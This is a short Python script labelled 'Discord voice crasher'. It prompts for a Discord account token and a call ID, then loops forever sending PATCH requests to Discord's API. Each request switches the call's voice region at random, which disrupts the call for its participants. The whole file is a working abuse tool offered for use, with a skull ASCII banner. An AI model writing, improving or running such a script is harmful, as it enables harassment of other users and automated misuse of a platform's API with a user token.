import requests, os, logging, random
from pystyle import *
logging.basicConfig(
    level=logging.INFO,
    format="\x1b[31m[\x1b[0m%(asctime)s\x1b[31m]\x1b[0m %(message)s",
    datefmt="%H:%M:%S"
)
os.system ("cls")
os.system ("title [Discord voice crasher] Main")
ascii = ("""
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~""")
print(Colorate.Horizontal(Colors.purple_to_blue,(ascii)))
token = input(Colorate.Horizontal(Colors.purple_to_blue,("\n\n\nToken: ")))
callid = input(Colorate.Horizontal(Colors.purple_to_blue,("Call ID: ")))
os.system ("title [Discord voice crasher] Crashing...")
def change():
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0',
        'Authorization': (token),

    }

    regions = ["brazil", "hongkong", "india", "japan", "rotterdam", "russia", "singapore", "southafrica", "sydney", "us-central", "us-east", "us-south", "us-west"] 
    region = random.choice(regions)
    json_data = {
        'region': (region),
    }
    response = requests.patch(f'https://discord.com/api/v9/channels/{callid}/call', headers=headers, json=json_data)
    if response.status_code == 204:
        logging.critical (f"Changed region to {region}")
    else:
        logging.critical ("Error")
while True:
    change()